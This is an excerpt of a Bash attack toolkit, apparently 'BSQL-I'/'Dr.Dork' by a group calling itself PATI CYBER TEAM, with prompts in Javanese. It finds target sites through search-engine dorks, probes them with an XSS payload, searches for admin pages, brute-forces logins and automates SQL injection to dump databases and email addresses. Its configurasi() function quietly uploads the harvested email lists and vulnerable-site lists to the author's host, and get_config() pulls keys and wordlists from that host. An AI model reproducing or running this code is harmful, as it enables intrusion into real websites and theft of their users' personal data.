...
xss_payload="%22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e" #jika mau diganti alert nya beri tulisan "Bahauddin"
...
${N}██╔══██╗██╔══██╗██║  ██║██╔══██╗██║ ██╔╝               ${P}  Dr.Dork${R}
${N}██████╔╝███████║███████║███████║█████╔╝       ${N} ⊱⋅ ──────────── ⋅⊰⊱${N}⋅
${N}██╔══██╗██╔══██║██╔══██║██╔══██║██╔═██╗       ${BL}Created by ${BR} Bahauddin${N} 
${N}██████╔╝██║  ██║██║  ██║██║  ██║██║  ██╗                    ${P}PATI CYBER TEAM 
${N}╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                       ${N}❏ ❐ ❑ ❒ ❏ ❐ ❏ ❐ ❑ ❒ ❏ ❐${R}                 
                       ${G}Awesome Dork tools${R}
                       ${N}❏ ❐ ❑ ❒ ❏ ❐ ❏ ❐ ❑ ❒ ❏ ❐${R}
                  ${O}1. ${N}Dork searcher${R}     
                  ${O}2. ${N}Get Random New Dork ${R}
                  ${O}3. ${N}Dorking${R}
                  ${O}4. ${N}Help${R}
                  ${G}root@Dr.dork# ${N}"
read menu
...
dorking() {
  echo -e "${N}\033[2mloading.... $dork\ngunakan ctrl-c Nggo skip Utowo nggo proses selanjute\n${N}Nteni disek Usahakno Internet Stabil..." | tr "+" " ";rm -rf .result_dork .not
    COUNT="$hitung"
...
do
   ...
   if [ -z "$link" ]
   then
      echo -e "${R}Cek Koneksi Disek Yo lur"
   fi
...
then
  ...
  do
     ...
     if [ -z "$ngecurl" ]
     then
        echo -e "${R}Cek Koneksi Disek Lur"
     fi
     echo -e "\033[0;96m$ngecurl"
     echo "$ngecurl" >> auto-gen.txt
     if [ "$set" = "20" ]
     then
        echo -en "${G}proses wes bar ape nambah dork?? y/n: ${O}"
        read pros
        if [ "$pros" = "y" ]
        then
...
intro() {
  ...
  echo -e "   GUNAKNO NGGO KEAPIKAN NGGO BANTU PENTESTING\n      ORA KANGGO NGRUSAK KABEH IKU TANGGUNG JAWAB PENGGUNA"
  echo -e "            don't be evil because devil is in your mind\n                 [ PATI CYBER TEAM ]           \n"

}
adminfin() {
echo -e "${N}[${G}*${N}]\033[2m Nggolek halaman Login Karo Dorking${N}"
pa="1"
trap break INT
for dork in $dork_login+inurl:$site
do
   echo -e "${N}\033[2mloading.... $dork\ngunakan ctrl-c kanggo skip utowo proses lanjute\n${N}nteni disek usahakno internet stabil..." | tr "+" " ";rm -rf .result_dork .not
...
echo -e "${BL}gunakan ctrl+c Kanggo Skip utowo Proses Lanjute\n${N}Nteni Ndisek Usahakno Internet Stabil..."
trap break 2 INT
...
then
  ...
  do
   ...
   echo -e "${N}[${R}!${N}] ${R}\033[2mCek Koneksi Utowo hasil Ora ono${N}"
fi
echo -e "${N}\033[2mfind login page use bruteforce site"
echo -e "${BL}gunakan ctrl+c Kanggo Skip Utowo Nggo Proses Selanjute\n${N}Nteni Ndisek Usahakno Internet Stabil..."
trap break 3 INT
...
trap - INT
if [[ -f .live ]];then
   echo -e "${N}${BL}nglumpukno login Seng di Temukno"
   ...
   echo -e "${R}\033[2mMaafe Gagal Nemukno Page Seng mbok goleki\nJajal Rubah Wordlist atau Racik Dewe"
   gagal="y"
fi
}
...
echo -e "${N}[${G}*${N}]\033[2m Nggolek i halaman login karo dorking${N}"
trap break INT
for dork in $dork
do
   echo -e "${N}\033[2mloading.... $dork\ngunakan ctrl-c Kanggo Skip utowo nggo proses lanjute\n${N}nteni disek usahakno internet stabil..." | tr "+" " ";rm -rf .result_dork .not
    for COUNT in $(seq 1 $pa) 
       do
         echo -e "${G}Result from bing page $COUNT${N}"
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "http://www.bing.com/search?q=$dork&qs=n&pq=$dork&sc=8-5&sp=-1&sk=&first=$COUNT&FORM=PORE" | grep -Po '_blank" href="[^"]*' | sort -u | uniq -i | cut -d '"' -f3 | sed '/facebook/d' | sed '/google/d' | sed '/twitter/d' | sed '/microsoft/d' | sed '/youtube/d' | sed '/&amp/d' | sed "/amp;/d" >> .result_dork
...
echo -e "${BL}gunakan ctrl+c Kanggo Skip Utowo Proses Lanjute\n${N}nteni disek usahakno internet stabil..."
trap break 2 INT
if cat .result_dork 2>/dev/null | sort -u | uniq -i | sed 's/\r$//' | tr -d "\0" | grep -a "$dir" >/dev/null
then
  for site3 in $(cat .result_dork 2>/dev/null | sort -u | uniq -i | sed 's/\r$//' | tr -d "\0" | grep -a "$dir")
...
if [[ "$sukses" = "" ]];then
   ...
   echo -e "${R}~ ${N}kosongkan Kanggo skip"
   echo -en "${G}masukno nama parameter: ${BL}"
   read param1
   while read xploit
   do
...
if [[ "$sukses" = "" ]];then
   ...
   echo -e "${R}~ ${N}kosongkan Kanggo skip"
   echo -en "${G}masukno postdata: ${BL}"
   read param1
   echo -en "${G}masukno tujuan post method: ${BL}"
   read tujuan
...
[${O}6${N}]. logout"
echo -ne "[${R}?${N}] Monggo Di Pilih?? "
read n
case $n in
   1) clear
      banner
      echo -e "\033[1m$N[$R+$N] ${O}bypass login bruteforce"
      echo -en "\033[1m$N[$G!$N] masukno taget: "
      read target
      bypass
   ...
   2) clear
      ...
      echo -ne "\033[1m$N[$G!$N] masukno list taget: "
      read tar
      ...
      for target in $(cat $tar 2>/dev/null)
       ...
       read -p "Mbalik Neng Menu y/n? " tanya
      if [[ "$tanya" = "y" ]];then
         menu
      fi
   ;;
   ...
   4) clear
      ...
      echo -n "[?] Monggo Di Pilih ?? "
      read d
      case $d in
      1) clear
         banner
         echo "[+] Reverse ip + auto find admin + Auto xploit"
         echo -n "[+] masukno site yang mau di reverse ip: "
         read site
   ...
   5) clear
      ...
      1) clear
         ...
         echo -n "[+] masukno site : "
         read site
         echo -n "[+] masukno wordlist admin finder: "
         read wordlistadmin
         echo -n "[+] masukno worldlist bypass login: "
         read wordlist
...
get_config(){
  ...
  curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "bahauddin.6te.net/.sites"  > .sites
  curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "bahauddin.6te.net/.key"  > .key
  curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "bahauddin.6te.net/union.txt" > union.txt
  curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "bahauddin.6te.net/admin_panel.txt" > $panel_admin
  echo "Done have fun.... :)"
  sleep 1
  clear
}
...
\033[7;31m BSQL-I v.1 ${N}${R} Bahauddin\033[0m
...
banner4() {
  echo -e " 
                  \033[7;31m BSQL-I v.1 ${N}${R} Bahauddin${N}
                          /
          ...
          \033[7m${R}\033[7m     ${N}\033[7m██${R}\033[7m ${N}\033[7m▀███▀${R}\033[7m ${N}\033[7m██${R}\033[7m      ${N}  ${R}Created${N} by Bahauddin${N}
          \033[7m   ▄ ▀████▀████▀ ▄    ${N}  ${O}Pati ${O} Cyber${O} Team${N}
          \033[7m ▀█    ██▀█▀██    █▀  ${N}
          \033[7m     Bahauddin      ${N}
...
banner2() {
echo -e "                    \033[7;31m BSQL-I v.1 ${N}${R} Bahauddin${N}${G}"
cat << "EOF"
                        
_           _           _    
| |         | |         | |                          Database hijacker tools
| |__   __ _| |__   __ _| | __                 |==┣▇▇▇▇▇▇═─-SQl-i
| '_ \ / _` | '_ \ / _` | |/ /                    Created By Bahauddin
| |_) | (_| | | | | (_| |   <                         PATI CYBER TEAM
...
banner3() {
  echo -e "    
                        \033[7;36mBSQL-I v.1 PRO${N}
                          /      ${N}\033[3;35msqli tools evolution${N}
                     
██████╗  █████╗ ██╗  ██╗ █████╗ ██╗  ██╗${N}|==┣▇▇▇▇▇▇═─-SQl-i${N}
██╔══██╗██╔══██╗██║  ██║██╔══██╗██║ ██╔╝${R}Created by${N}Bahauddin${N}
██████╔╝███████║███████║███████║█████╔╝   ${O}PATI ${O}CYBER${O} TEAM${N} 
██╔══██╗██╔══██║██╔══██║██╔══██║██╔═██╗ 
██████╔╝██║  ██║██║  ██║██║  ██║██║  ██╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
...
edump () {
  ...
  do
   ...
   do
     if [[ "$masn" = "y" ]];then 
        echo -e "${N}\033[2mpress ctrl+c kemudian ctrl+d Kanggo skip site${N}"
     else
        echo -e "${N}\033[2mpress ctrl+c kemudian ctrl+d Kanggo exit${N}"
     fi
          ...
          then
              ...
              then
                 ...
                 then
                    ...
                    echo -e "${O}\033[2mpastikno nama seng di masukno wes sesuai${N}"
                       ...
                       then
                          if [ -f .output ];then
                             ...
                             *) echo -en "\n${O}skip to next site${N}";;
                             ...
                             echo -e "KOSONG\n${N}+$coi+"
                             echo -e "${R}\033[2mF A I L E D try dump dios manual$N\n\033[2mpastekno input seng di masukno bener utowo cek koneksi\nNak input wes bener mungkin colomn seng di tuju kosong${N}"
                             echo -n -e "${N}${G}1.${N} Dump lagi\n${N}${G}2.${N} kembali ke database awal${N}${G}\n3.${N} kembali kemenu utama"
                             if [[ "$masn" = "y" ]];then
                                echo -en "\n${BL}biarkan kosong lalu tekan ENTER skip to next site${N}"
                             fi
...
if [ "$db" = "" ]
then
   echo -e "\x1b[0m${N}[${R}\033[2m`date +%T`${N}] ${O}Gagal jikuk DB${N}"
   fail="y"
else
   ...
   echo -e "${N}\033[2mtekan ctrl+c 2x Kanggo Skip Utowo Proses Lanjute${N}"
   echo -e "+$coi+\n Table Name::colomn name\n+$coi+$O"
   trap break 4 INT
   for pot in $(seq 50)
   do
     ...
     then
        ...
        then
           ...
           echo -e "${O}Kosong\n${N}+$coi+"
           echo -e "\033[2mdatabase seng dituju kosong${N}"
           error
           break
        fi 
     else
...
gen() {
  echo -e "                |\033[7;32m Dork generator by Bahauddin ${N}|\n\n${O}cth: product cart buy${N}"
...
if [ $? -eq 0 ];then
  ...
  then
    ...
    echo -e "${R}[!] inject point sqli ora di temokno\ncoba cek output/$dir/crawled.txt kanggo golek inject point dewe${N}"
   fi
else
  echo "[!] gagal jikuk url"
fi
fi
fi
else
       echo -e "${R}connection error: periksa ndisek URL atau server down$N" >&2
fi
}
...
dora() {
  ...
  echo -e "${N}\033[2mloading.... $dork\ngunakan ctrl-c Kanggo Skip Utowo Proses Lanjute\n${N}nteni disek usahakno internet stabil..." | tr "+" " ";rm -rf .result_dork .not .url
    for COUNT in $(seq 1 $pa) 
       do
         echo -e "${G}Result from bing page $COUNT${N}"
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "http://www.bing.com/search?q=$dork&qs=n&pq=$dork&sc=8-5&sp=-1&sk=&first=$COUNT&FORM=PORE" | grep -Po '_blank" href="[^"]*' | sort -u | uniq -i | cut -d '"' -f3 | sed '/facebook/d' | sed '/google/d' | sed '/twitter/d' | sed '/microsoft/d' | sed '/youtube/d' | sed '/&amp/d' | sed "/amp;/d" >> .result_dork
   ...
   echo -e "${N}\033[2mgunakan ctrl+c Kanggo Skip Utowo Proses Lanjute\n${N}nteni disek usahakno internet stabil..."
...
dorkscan() {
  ...
  for admin in `echo "$admin_dork" | tr -d '\0' | sed 's/\r$//'`
   ...
   if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -sL --max-time $time_out "$b$xss_payload" | grep -Po "Bahauddin" | tr -d '\0' | sed 's/\r$//' >/dev/null
   then
...
dump() {  
         #echo -e "$by \n $waff"
          ...
          if [[ "$boot_empas" = "y" ]];then
          	         ...
          	         do 
                          ...
                          do
                            ...
                            if [[ "$ump" = "r" ]]
                            then
                               echo -e "${N}[${O}INFO${N}] ${O}F A I L E D try dump dios manual$N\n\033[2m${BL}pastekno input seng di masukno bener utowo cek koneksi\nNak input wes bener mungkin colomn seng di tuju kosong${N}"
                               break
                            fi
                            if [[ "$based64" = "y" ]]
                            then
          ...
          while [ $ok = 0 ]
           do
            echo -e "${N}\033[2mpress ctrl+c kemudian ctrl+d Kanggo skip${N}"
                    ...
                    then
                       ...
                       then
                          ...
                          do
                            ...
                            then
                               echo -e "${N}[${O}INFO${N}] ${O}F A I L E D try dump dios manual$N\n\033[2mPastekno input seng di masukno bener utowo cek koneksi\nNak input wes bener mungkin colomn seng di tuju kosong${N}"
                               echo -n -e "${N}${G}1.${N} Dump lagi\n${N}${G}2.${N} mbalik neng database awal${N}${G}\n3.${N} mbalik kemenu utama"
                               if [[ "$masn" = "y" ]];then
                            ...
                            then
                               ...
                               then
                                  ...
                                  cat output/$dir/dump-$table.txt | grep -v gmail | grep -v yahoo | grep -v aol | grep -v hotmail >> others.txt
                                  echo -e "${N}[${G}+${N}] others : ${G}`wc -l others.txt`${N}"
                                  echo -n -e "${N}${G}1.${N} Dump lagi\n${N}${G}2.${N} balik ke database awal${N}${G}\n3.${N} balik kemenu utama"
                               if [[ "$masn" = "y" ]];then
                                  echo -e "\n${G}\033[2mpress ctrl/vol + D skip to next site${N}"
...
info() {
  #echo -e "$by \n $waff"
   ...
   echo -e "$angka" |  sed 's/Bahauddin//g' | grep -a -o '[0-9]' > .angka
   if cat .angka >/dev/null
   then
      if echo $ngecur | grep -Po "where clause" >/dev/null
      then
        df=$(echo $ngecur | grep -Po "Bahauddin[0-9]*" | sed 's/Bahauddin//g')
        ids=$(echo "$site$union$colom--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")
        curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ids" | grep -Po 'Bahauddin[0-9]*' > .angka
        cat .angka |  sed 's/Bahauddin//g' > .angka
      fi
    if [[ "$based64" = "y" ]]
    then
    ...
    ff=$(cat .db)
            if [[ "$ff" = "" ]]
            then
              echo -e "${R}\033[2mFAILED njikuk nama db${N}"
            else
   ...
   do
    ...
    then
       ...
       info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$base94" | grep -a -o "Bahauddin&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/Bahauddin/d' | tr -d '\0' | sed 's/\r$//')
    else #php
       if [[ "$html" = "y" ]]
       then
          if [[ "$corona" = "y" ]];then
       ...
       then
          dk=$(echo -e "$union$db")
          info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -LX POST "$site" --data "$postnya=null$dk" | grep -a -o "Bahauddin&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/Bahauddin/d' | tr -d '\0' | sed 's/\r$//')
       else
          info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$dk" | grep -a -o "Bahauddin&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/Bahauddin/d' | tr -d '\0' | sed 's/\r$//')
       fi
...
configurasi() {
	...
	curl -s "bahauddin.6te.net/config/edit.php?p=injected-$pengguna" -X POST -d "newd=${bit2}" >/dev/null
	echo -n "."
	bit3=$(cat gmail.txt 2>/dev/null | sort -u | uniq -i | sort -u | uniq -i | sed "s/&/\&/g" )
	bit4=$(echo -e "Date: $tanggal\n\n$bit3\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	curl -s "bahauddin.6te.net/config/edit.php?p=gmail-$pengguna" -X POST -d "newd=${bit4}" >/dev/null
	echo -n "."
	bit5=$(cat yahoo.txt 2>/dev/null | sort -u | uniq -i | sort -u | uniq -i | sed "s/&/\&/g" )
	bit6=$(echo -e "Date: $tanggal\n\n$bit5\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	curl -s "bahauddin.6te.net/config/edit.php?p=yahoo-$pengguna" -X POST -d "newd=${bit6}" >/dev/null
	echo -n "."
	bit7=$(cat hotmail.txt 2>/dev/null | sort -u | uniq -i)
	bit8=$(echo -e "Date: $tanggal\n\n$bit7\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	echo -en "\033[2m\ntunggu sebentar..."
	curl -s "bahauddin.6te.net/config/edit.php?p=hotmail-$pengguna" -X POST -d "newd=${bit8}" >/dev/null
	echo -n "."
	bit9=$(cat aol.txt 2>/dev/null | sort -u | uniq -i | sort -u | uniq -i | sed "s/&/\&/g" )
	bit10=$(echo -e "Date: $tanggal\n\n$bit9\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	curl -s "bahauddin.6te.net/config/edit.php?p=aol-$pengguna" -X POST -d "newd=${bit10}" >/dev/null
	echo -n "."
	bit11=$(cat vuln.txt 2>/dev/null | sort -u | uniq -i)
	bit12=$(echo -e "Date: $tanggal\n\n$bit11\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	curl -s "bahauddin.6te.net/config/edit.php?p=vuln-$pengguna" -X POST -d "newd=${bit12}" >/dev/null
	echo -n "."
	echo -en "\033[2m\nsuccess!!\n"
}
dios() {
  ...
  if cat .angka >/dev/null
  then
    if echo $ngecur | grep -Po "Unknown column 'Bahauddin[0-9]*'" >/dev/null
    then
        df=$(echo $ngecur | grep -Po "Bahauddin[0-9]*" | sed 's/Bahauddin//g')
        ids=$(echo "$site$union$colom--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")
        curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ids" | grep -Po 'Bahauddin[0-9]*' > .angka
...
for i in $(seq $order_start $order_by)
  do
   ...
   if [ $? -eq 0 ]
    ...
    if echo "$ngecur" | grep -Po "Bahauddin3|Bahauddin[0-9]*" > .angka
      then
...
\033[2mpress Enter Kanggo Keluar${N}"
echo -ne "[${R}?${N}] Monggo Di Pilih Lur ?? "
read d
case $d in
 1) mass="n"
    dump_name="n"
 ...
 2) masn="y"
    ...
    echo -e "${N}\033[2mgunakan ctrl+c saat order by kanggo skip neng site selanjut e${N}"
    rm -rf .case1
    trap break INT
      ...
      case $d in
       1) masn="y"
        ...
        2) masn="y"
          ...
          menu
       ;;
         *) echo -e "${N}[${G}+${N}] Matursuwun Wes Nganggo tools iki";;
         esac
   ;;
   15) bysqli
   ;;
